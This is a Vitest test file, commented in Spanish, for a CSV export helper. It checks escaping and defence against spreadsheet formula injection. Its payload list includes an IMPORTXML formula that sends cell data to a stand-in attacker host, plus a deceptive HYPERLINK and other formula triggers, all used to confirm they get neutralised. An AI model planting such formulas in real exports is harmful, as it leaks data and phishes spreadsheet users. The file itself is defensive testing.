import { describe, it, expect } from 'vitest'
import { toCSV } from '@/lib/utils/csv'

// ============================================================================
// Este fichero estaba al 0% de cobertura, y exporta datos que escriben los
// usuarios. Sin test, un cambio aquí no lo detecta nadie hasta que un comercio
// descarga un CSV roto — o uno peligroso.
//
// El caso que importa es la inyección de fórmulas. Si alguien debilita
// escapeCSV, estos tests tienen que ponerse rojos. Se comprueba rompiéndolos a
// propósito, como en el PASO 63b.
// ============================================================================

describe('toCSV · lo básico', () => {
  it('con una lista vacía devuelve cadena vacía, no una cabecera huérfana', () => {
    expect(toCSV([])).toBe('')
  })

  it('la primera línea son las cabeceras y el resto los datos', () => {
    const csv = toCSV([
      { nombre: 'Ana', ciudad: 'Santiago' },
      { nombre: 'Luis', ciudad: 'Valparaíso' },
    ])

    expect(csv.split('\n')).toEqual(['nombre,ciudad', 'Ana,Santiago', 'Luis,Valparaíso'])
  })

  it('respeta las columnas que le pides, en el orden que se las pides', () => {
    const csv = toCSV(
      [{ a: '1', b: '2', c: '3' }],
      [
        { key: 'c', label: 'Tercero' },
        { key: 'a', label: 'Primero' },
      ],
    )

    expect(csv).toBe('Tercero,Primero\n3,1')
  })

  it('los valores null y undefined salen como celda vacía, no como "null"', () => {
    const csv = toCSV([{ a: 'x', b: null, c: undefined }])

    expect(csv).toBe('a,b,c\nx,,')
  })

  it('los números se escriben tal cual', () => {
    expect(toCSV([{ precio: 1500 }])).toBe('precio\n1500')
  })
})

describe('toCSV · escapado', () => {
  it('un valor con coma va entre comillas para no partir la fila', () => {
    expect(toCSV([{ texto: 'Pan, queso' }])).toBe('texto\n"Pan, queso"')
  })

  it('las comillas dobles se duplican, que es el estándar', () => {
    expect(toCSV([{ texto: 'Dijo "hola"' }])).toBe('texto\n"Dijo ""hola"""')
  })

  it('un salto de línea dentro de un valor va entre comillas', () => {
    // Ojo: partir por \n sigue dando 3 trozos, porque el salto está DENTRO de
    // las comillas. Eso es correcto y esperable: quien lea el CSV con un
    // parser de verdad verá una sola fila. Partir a mano no es un parser.
    expect(toCSV([{ texto: 'línea1\nlínea2' }])).toBe('texto\n"línea1\nlínea2"')
  })

  it('un retorno de carro también se escapa (antes no se comprobaba)', () => {
    const csv = toCSV([{ texto: 'a\rb' }])

    expect(csv).toBe('texto\n"a\rb"')
  })
})

describe('toCSV · inyección de fórmulas', () => {
  // Cada uno de estos, sin protección, se ejecuta al abrir el CSV en Excel
  // o en Google Sheets.
  const payloads = [
    '=HYPERLINK("http://sitio-falso.cl","Ver mi reserva")',
    '=IMPORTXML("http://atacante.cl?d="&A2,"//x")',
    '+SUM(A1:A9)',
    '-1+2',
    '@SUM(A1)',
    '\t=cmd',
    '\r=cmd',
    '=1+1',
  ]

  it.each(payloads)('neutraliza %j para que no se ejecute', (payload) => {
    const csv = toCSV([{ campo: payload }])
    const celda = csv.split('\n')[1]

    // Muchos payloads llevan coma, así que la celda va entre comillas y el
    // apóstrofo queda DENTRO: "'=HYPERLINK(...)". Hay que quitar las comillas
    // de fuera antes de mirar. Excel hace lo mismo y lo trata como texto.
    const entreComillas = celda.startsWith('"')
    const dentro = entreComillas ? celda.slice(1, -1) : celda

    // Empieza por apóstrofo: la hoja de cálculo lo trata como texto.
    expect(dentro.startsWith("'")).toBe(true)

    // Y el contenido original sigue ahí, no se pierde el dato. Si la celda va
    // entre comillas, las comillas del propio valor aparecen duplicadas: es el
    // estándar de CSV, no una pérdida de información.
    const esperado = entreComillas ? payload.replace(/"/g, '""') : payload
    expect(dentro.slice(1)).toBe(esperado)
  })

  it('el ataque real: un cliente se llama como una fórmula', () => {
    // Los campos Pack y Cliente los escriben los usuarios (migración de
    // business/reservations/page.tsx). Este es el caso que nos ocupa.
    const csv = toCSV([
      {
        Cliente: '=HYPERLINK("http://falso.cl","Ver")',
        Pack: 'Pack normal',
      },
    ])

    expect(csv).toContain('"\'=HYPERLINK(')
    expect(csv).not.toContain('"=HYPERLINK(')
  })

  it('un número negativo NO se toca: -1500 sigue siendo -1500', () => {
    // Si neutralizáramos todo lo que empieza por -, los importes negativos
    // pasarían a ser texto y el comercio no podría sumarlos.
    expect(toCSV([{ precio: -1500 }])).toBe('precio\n-1500')
  })

  it('un decimal negativo tampoco se toca', () => {
    expect(toCSV([{ precio: -15.5 }])).toBe('precio\n-15.5')
  })
})
